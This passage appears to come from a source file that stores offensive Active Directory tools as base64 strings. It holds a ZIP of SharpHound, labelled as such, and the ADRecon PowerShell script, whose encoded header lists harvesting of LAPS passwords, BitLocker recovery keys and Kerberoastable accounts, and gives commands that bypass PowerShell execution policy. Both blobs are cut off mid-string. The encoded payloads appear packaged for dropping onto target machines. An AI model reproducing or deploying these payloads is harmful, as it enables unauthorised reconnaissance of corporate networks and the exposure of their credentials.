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BIb3VuZC0yLlgvc3JjL1J1bnRpbWUvQ2xpZW50SGVscGVycy5jc1VUBQAB0H36aFBLAQIAAAoAAAAIAGZhV1vc5u/towYAAEQYAAAsAAkAAAAAAAEAAAAAADvBAABTaGFycEhvdW5kLTIuWC9zcmMvUnVudGltZS9Db2xsZWN0aW9uVGFzay5jc1VUBQAB0H36aFBLAQIAAAoAAAAIAGZhV1tiY99cbwMAAJoJAAAqAAkAAAAAAAEAAAAAADHIAABTaGFycEhvdW5kLTIuWC9zcmMvUnVudGltZS9MREFQQ29uc3VtZXIuY3NVVAUAAdB9+mhQSwECAAAKAAAACABmYVdbbPNCyg0FAABJEQAAKQAJAAAAAAABAAAAAADxywAAU2hhcnBIb3VuZC0yLlgvc3JjL1J1bnRpbWUvTG9vcE1hbmFnZXIuY3NVVAUAAdB9+mhQSwECAAAKAAAACABmYVdbk/xLdRIWAABuwgAALgAJAAAAAAABAAAAAABO0QAAU2hhcnBIb3VuZC0yLlgvc3JjL1J1bnRpbWUvT2JqZWN0UHJvY2Vzc29ycy5jc1VUBQAB0H36aFBLAQIAAAoAAAAIAGZhV1t4LZLEeAgAAHImAAAqAAkAAAAAAAEAAAAAALXnAABTaGFycEhvdW5kLTIuWC9zcmMvUnVudGltZS9PdXRwdXRXcml0ZXIuY3NVVAUAAdB9+mhQSwECAAAKAAAACABmYVdbVadM9JsOAACwPgAAIAAJAAAAAAABAAAAAAB+8AAAU2hhcnBIb3VuZC0yLlgvc3JjL1NoYXJwTGlua3MuY3NVVAUAAdB9+mhQSwECAAAKAAAACABmYVdbbTmU6zoKAAA5KAAAIAAJAAAAAAABAAAAAABg/wAAU2hhcnBIb3VuZC0yLlgvc3JjL1NoYXJwaG91bmQuY3NVVAUAAdB9+mhQSwECAAAKAAAAAABmYVdbAAAAAAAAAAAAAAAAGwAJAAAAAAAAABAAAADhCQEAU2hhcnBIb3VuZC0yLlgvc3JjL1dyaXRlcnMvVVQFAAHQffpoUEsBAgAACgAAAAgAZmFXW4oFSCV+AQAAAAQAACgACQAAAAAAAQAAAAAAIwoBAFNoYXJwSG91bmQtMi5YL3NyYy9Xcml0ZXJzL0Jhc2VXcml0ZXIuY3NVVAUAAdB9+mhQSwECAAAKAAAACABmYVdbzGIxZCUDAABhCQAALgAJAAAAAAABAAAAAADwCwEAU2hhcnBIb3VuZC0yLlgvc3JjL1dyaXRlcnMvQ29tcFN0YXR1c1dyaXRlci5jc1VUBQAB0H36aFBLAQIAAAoAAAAIAGZhV1uUeww1GgUAAFcQAAAsAAkAAAAAAAEAAAAAAGoPAQBTaGFycEhvdW5kLTIuWC9zcmMvV3JpdGVycy9Kc29uRGF0YVdyaXRlci5jc1VUBQAB0H36aFBLBQYAAAAANAA0AFkSAADXFAEAKABkYzQyMGE2M2E1NWYwMzI3NTJhYjBiYzY3MWMxM2IzNTA1MzQyN2Vi',  # Base64-encoded SharpHound ZIP
    'adrecon': '77u/PCMKCi5TWU5PUFNJUwoKICAgIEFEUmVjb24gaXMgYSB0b29sIHdoaWNoIGdhdGhlcnMgaW5mb3JtYXRpb24gYWJvdXQgdGhlIEFjdGl2ZSBEaXJlY3RvcnkgYW5kIGdlbmVyYXRlcyBhIHJlcG9ydCB3aGljaCBjYW4gcHJvdmlkZSBhIGhvbGlzdGljIHBpY3R1cmUgb2YgdGhlIGN1cnJlbnQgc3RhdGUgb2YgdGhlIHRhcmdldCBBRCBlbnZpcm9ubWVudC4KCi5ERVNDUklQVElPTgoKICAgIEFEUmVjb24gaXMgYSB0b29sIHdoaWNoIGV4dHJhY3RzIGFuZCBjb21iaW5lcyB2YXJpb3VzIGFydGVmYWN0cyAoYXMgaGlnaGxpZ2h0ZWQgYmVsb3cpIG91dCBvZiBhbiBBRCBlbnZpcm9ubWVudC4gVGhlIGluZm9ybWF0aW9uIGNhbiBiZSBwcmVzZW50ZWQgaW4gYSBzcGVjaWFsbHkgZm9ybWF0dGVkIE1pY3Jvc29mdCBFeGNlbCByZXBvcnQgdGhhdCBpbmNsdWRlcyBzdW1tYXJ5IHZpZXdzIHdpdGggbWV0cmljcyB0byBmYWNpbGl0YXRlIGFuYWx5c2lzIGFuZCBwcm92aWRlIGEgaG9saXN0aWMgcGljdHVyZSBvZiB0aGUgY3VycmVudCBzdGF0ZSBvZiB0aGUgdGFyZ2V0IEFEIGVudmlyb25tZW50LgogICAgVGhlIHRvb2wgaXMgdXNlZnVsIHRvIHZhcmlvdXMgY2xhc3NlcyBvZiBzZWN1cml0eSBwcm9mZXNzaW9uYWxzIGxpa2UgYXVkaXRvcnMsIERGSVIsIHN0dWRlbnRzLCBhZG1pbmlzdHJhdG9ycywgZXRjLiBJdCBjYW4gYWxzbyBiZSBhbiBpbnZhbHVhYmxlIHBvc3QtZXhwbG9pdGF0aW9uIHRvb2wgZm9yIGEgcGVuZXRyYXRpb24gdGVzdGVyLgogICAgSXQgY2FuIGJlIHJ1biBmcm9tIGFueSB3b3Jrc3RhdGlvbiB0aGF0IGlzIGNvbm5lY3RlZCB0byB0aGUgZW52aXJvbm1lbnQsIGV2ZW4gaG9zdHMgdGhhdCBhcmUgbm90IGRvbWFpbiBtZW1iZXJzLiBGdXJ0aGVybW9yZSwgdGhlIHRvb2wgY2FuIGJlIGV4ZWN1dGVkIGluIHRoZSBjb250ZXh0IG9mIGEgbm9uLXByaXZpbGVnZWQgKGkuZS4gc3RhbmRhcmQgZG9tYWluIHVzZXIpIGFjY291bnQuCiAgICBGaW5lIEdyYWluZWQgUGFzc3dvcmQgUG9saWN5LCBMQVBTIGFuZCBCaXRMb2NrZXIgbWF5IHJlcXVpcmUgUHJpdmlsZWdlZCB1c2VyIGFjY291bnRzLgogICAgVGhlIHRvb2wgd2lsbCB1c2UgTWljcm9zb2Z0IFJlbW90ZSBTZXJ2ZXIgQWRtaW5pc3RyYXRpb24gVG9vbHMgKFJTQVQpIGlmIGF2YWlsYWJsZSwgb3RoZXJ3aXNlIGl0IHdpbGwgY29tbXVuaWNhdGUgd2l0aCB0aGUgRG9tYWluIENvbnRyb2xsZXIgdXNpbmcgTERBUC4KICAgIFRoZSBmb2xsb3dpbmcgaW5mb3JtYXRpb24gaXMgZ2F0aGVyZWQgYnkgdGhlIHRvb2w6CiAgICAtIEZvcmVzdDsKICAgIC0gRG9tYWluOwogICAgLSBUcnVzdHM7CiAgICAtIFNpdGVzOwogICAgLSBTdWJuZXRzOwogICAgLSBEZWZhdWx0IGFuZCBGaW5lIEdyYWluZWQgUGFzc3dvcmQgUG9saWN5IChpZiBpbXBsZW1lbnRlZCk7CiAgICAtIERvbWFpbiBDb250cm9sbGVycywgU01CIHZlcnNpb25zLCB3aGV0aGVyIFNNQiBTaWduaW5nIGlzIHN1cHBvcnRlZCBhbmQgRlNNTyByb2xlczsKICAgIC0gVXNlcnMgYW5kIHRoZWlyIGF0dHJpYnV0ZXM7CiAgICAtIFNlcnZpY2UgUHJpbmNpcGFsIE5hbWVzIChTUE5zKTsKICAgIC0gR3JvdXBzIGFuZCBtZW1iZXJzaGlwczsKICAgIC0gT3JnYW5pemF0aW9uYWwgVW5pdHMgKE9Vcyk7CiAgICAtIEdyb3VwIFBvbGljeSBPYmplY3QgYW5kIGdQTGluayBkZXRhaWxzOwogICAgLSBETlMgWm9uZXMgYW5kIFJlY29yZHM7CiAgICAtIFByaW50ZXJzOwogICAgLSBDb21wdXRlcnMgYW5kIHRoZWlyIGF0dHJpYnV0ZXM7CiAgICAtIFBhc3N3b3JkQXR0cmlidXRlcyAoRXhwZXJpbWVudGFsKTsKICAgIC0gTEFQUyBwYXNzd29yZHMgKGlmIGltcGxlbWVudGVkKTsKICAgIC0gQml0TG9ja2VyIFJlY292ZXJ5IEtleXMgKGlmIGltcGxlbWVudGVkKTsKICAgIC0gQUNMcyAoREFDTHMgYW5kIFNBQ0xzKSBmb3IgdGhlIERvbWFpbiwgT1VzLCBSb290IENvbnRhaW5lcnMsIEdQTywgVXNlcnMsIENvbXB1dGVycyBhbmQgR3JvdXBzIG9iamVjdHM7CiAgICAtIEdQT1JlcG9ydCAocmVxdWlyZXMgUlNBVCk7CiAgICAtIEtlcmJlcm9hc3QgKG5vdCBpbmNsdWRlZCBpbiB0aGUgZGVmYXVsdCBjb2xsZWN0aW9uIG1ldGhvZCk7IGFuZAogICAgLSBEb21haW4gYWNjb3VudHMgdXNlZCBmb3Igc2VydmljZSBhY2NvdW50cyAocmVxdWlyZXMgcHJpdmlsZWdlZCBhY2NvdW50IGFuZCBub3QgaW5jbHVkZWQgaW4gdGhlIGRlZmF1bHQgY29sbGVjdGlvbiBtZXRob2QpLgoKICAgIEF1dGhvciAgICAgOiBQcmFzaGFudCBNYWhhamFuCiAgICBDb21wYW55ICAgIDogaHR0cHM6Ly93d3cuc2Vuc2VvZnNlY3VyaXR5LmNvbS5hdQoKLk5PVEVTCgogICAgVGhlIGZvbGxvd2luZyBjb21tYW5kcyBjYW4gYmUgdXNlZCB0byB0dXJuIG9mZiBFeGVjdXRpb25Qb2xpY3k6IChSZXF1aXJlcyBBZG1pbiBQcml2cykKCiAgICBQUyA+ICRFeGVjUG9saWN5ID0gR2V0LUV4ZWN1dGlvblBvbGljeQogICAgUFMgPiBTZXQtRXhlY3V0aW9uUG9saWN5IGJ5cGFzcwogICAgUFMgPiAuXEFEUmVjb24ucHMxCiAgICBQUyA+IFNldC1FeGVjdXRpb25Qb2xpY3kgJEV4ZWNQb2xpY3kKCiAgICBPUgoKICAgIFN0YXJ0IHRoZSBQb3dlclNoZWxsIGFzIGZvbGxvd3M6CiAgICBwb3dlcnNoZWxsLmV4ZSAtZXAgYnlwYXNzCgogICAgT1IKCiAgICBBbHJlYWR5IGhhdmUgYSBQb3dlclNoZWxsIG9wZW4gPwogICAgUFMgPiAkRW52OlBTRXhlY3V0aW9uUG9saWN5UHJlZmVyZW5jZSA9ICdCeXBhc3MnCgogICAgT1IKCiAgICBwb3dlcnNoZWxsLmV4ZSAtbm9sb2dvIC1leGVjdXRpb25wb2xpY3kgYnlwYXNzIC1ub3Byb2ZpbGUgLWZpbGUgQURSZWNvbi5wczEKCi5QQVJBTUVURVIgUHJvdG9jb2wKCVdoaWNoIHByb3RvY29sIHRvIHVzZTsgQURXUyAoZGVmYXVsdCkgb3IgTERBUAoKLlBBUkFNRVRFUiBEb21haW5Db250cm9sbGVyCglEb21haW4gQ29udHJvbGxlciBJUCBBZGRyZXNzIG9yIERvbWFpbiBGUUROLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCglEb21haW4gQ3JlZGVudGlhbHMuCgouUEFSQU1FVEVSIEdlbkV4Y2VsCglQYXRoIGZvciBBRFJlY29uIG91dHB1dCBmb2xkZXIgY29udGFpbmluZyB0aGUgQ1NWIGZpbGVzIHRvIGdlbmVyYXRlIHRoZSBBRFJlY29uLVJlcG9ydC54bHN4LiBVc2UgaXQgdG8gZ2VuZXJhdGUgdGhlIEFEUmVjb24tUmVwb3J0Lnhsc3ggd2hlbiBNaWNyb3NvZnQgRXhjZWwgaXMgbm90IGluc3RhbGxlZCBvbiB0aGUgaG9zdCB1c2VkIHRvIHJ1biBBRFJlY29uLgoKLlBBUkFNRVRFUiBPdXRwdXREaXIKCVBhdGggZm9yIEFEUmVjb24gb3V0cHV0IGZvbGRlciB0byBzYXZlIHRoZSBmaWxlcyBhbmQgdGhlIEFEUmVjb24tUmVwb3J0Lnhsc3guIChUaGUgZm9sZGVyIHNwZWNpZmllZCB3aWxsIGJlIGNyZWF0ZWQgaWYgaXQgZG9lc24ndCBleGlzdCkKCi5QQVJBTUVURVIgQ29sbGVjdAogICAgV2hpY2ggbW9kdWxlcyB0byBydW47IENvbW1hIHNlcGFyYXRlZDsgZS5nIEZvcmVzdCxEb21haW4gKERlZmF1bHQgYWxsIGV4Y2VwdCBLZXJiZXJvYXN0LCBEb21haW5BY2NvdW50c3VzZWRmb3JTZXJ2aWNlTG9nb24pCiAgICBWYWxpZCB2YWx1ZXMgaW5jbHVkZTogRm9yZXN0LCBEb21haW4sIFRydXN0cywgU2l0ZXMsIFN1Ym5ldHMsIFBhc3N3b3JkUG9saWN5LCBGaW5lR3JhaW5lZFBhc3N3b3JkUG9saWN5LCBEb21haW5Db250cm9sbGVycywgVXNlcnMsIFVzZXJTUE5zLCBQYXNzd29yZEF0dHJpYnV0ZXMsIEdyb3VwcywgR3JvdXBNZW1iZXJzLCBPVXMsIEdQT3MsIGdQTGlua3MsIEROU1pvbmVzLCBQcmludGVycywgQ29tcHV0ZXJzLCBDb21wdXRlclNQTnMsIExBUFMsIEJpdExvY2tlciwgQUNMcywgR1BPUmVwb3J0LCBLZXJiZXJvYXN0LCBEb21haW5BY2NvdW50c3VzZWRmb3JTZXJ2aWNlTG9nb24uCgouUEFSQU1FVEVSIE91dHB1dFR5cGUKICAgIE91dHB1dCBUeXBlOyBDb21tYSBzZXBlcmF0ZWQ7IGUuZyBTVERPVVQsQ1NWLFhNTCxKU09OLEhUTUwsRXhjZWwgKERlZmF1bHQgU1RET1VUIHdpdGggLUNvbGxlY3QgcGFyYW1ldGVyLCBlbHNlIENTViBhbmQgRXhjZWwpLgogICAgVmFsaWQgdmFsdWVzIGluY2x1ZGU6IFNURE9VVCwgQ1NWLCBYTUwsIEpTT04sIEhUTUwsIEV4Y2VsLCBBbGwgKGV4Y2x1ZGVzIFNURE9VVCkuCgouUEFSQU1FVEVSIERvcm1hbnRUaW1lU3BhbgogICAgVGltZXNwYW4gZm9yIERvcm1hbnQgYWNjb3VudHMuIChEZWZhdWx0IDkwIGRheXMpCgouUEFSQU1FVEVSIFBhc3NNYXhBZ2UKICAgIE1heGltdW0gbWFjaGluZSBhY2NvdW50IHBhc3N3b3JkIGFnZS4gKERlZmF1bHQgMzAgZGF5cykKCi5QQVJBTUVURVIgUGFnZVNpemUKICAgIFRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgVGhyZWFkcwogICAgVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBkdXJpbmcgcHJvY2Vzc2luZyBvYmplY3RzLiAoRGVmYXVsdCAxMCkKCi5QQVJBTUVURVIgTG9nCiAgICBDcmVhdGUgQURSZWNvbiBMb2cgdXNpbmcgU3RhcnQtVHJhbnNjcmlwdAoKLkVYQU1QTEUKCgkuXEFEUmVjb24ucHMxIC1HZW5FeGNlbCBDOlxBRFJlY29uLVJlcG9ydC08dGltZXN0YW1wPgogICAgWypdIEFEUmVjb24gPHZlcnNpb24+IGJ5IFByYXNoYW50IE1haGFqYW4gKEBwcmFzaGFudDM1MzUpIGZyb20gU2Vuc2Ugb2YgU2VjdXJpdHkuCiAgICBbKl0gR2VuZXJhdGluZyBBRFJlY29uLVJlcG9ydC54bHN4CiAgICBbK10gRXhjZWxzaGVldCBTYXZlZCB0bzogQzpcQURSZWNvbi1SZXBvcnQtPHRpbWVzdGFtcD5cPGRvbWFpbj4tQURSZWNvbi1SZXBvcnQueGxzeAoKLkVYQU1QTEUKCgkuXEFEUmVjb24ucHMxIC1Eb21haW5Db250cm9sbGVyIDxJUCBvciBGUUROPiAtQ3JlZGVudGlhbCA8ZG9tYWluXHVzZXJuYW1lPgogICAgWypdIEFEUmVjb24gPHZlcnNpb24+IGJ5IFByYXNoYW50IE1haGFqYW4gKEBwcmFzaGFudDM1MzUpIGZyb20gU2Vuc2Ugb2YgU2VjdXJpdHkuCglbKl0gUnVubmluZyBvbiA8ZG9tYWluPlw8aG9zdG5hbWU+IC0gTWVtYmVyIFdvcmtzdGF0aW9uCiAgICA8c25pcD4KCiAgICBFeGFtcGxlIG91dHB1dCBmcm9tIERvbWFpbiBNZW1iZXIgd2l0aCBBbHRlcm5hdGUgQ3JlZGVudGlhbHMuCgouRVhBTVBMRQoKCS5cQURSZWNvbi5wczEgLURvbWFpbkNvbnRyb2xsZXIgPElQIG9yIEZRRE4+IC1DcmVkZW50aWFsIDxkb21haW5cdXNlcm5hbWU+IC1Db2xsZWN0IERvbWFpbkNvbnRyb2xsZXJzIC1PdXRwdXRUeXBlIEV4Y2VsCiAgICBbKl0gQURSZWNvbiA8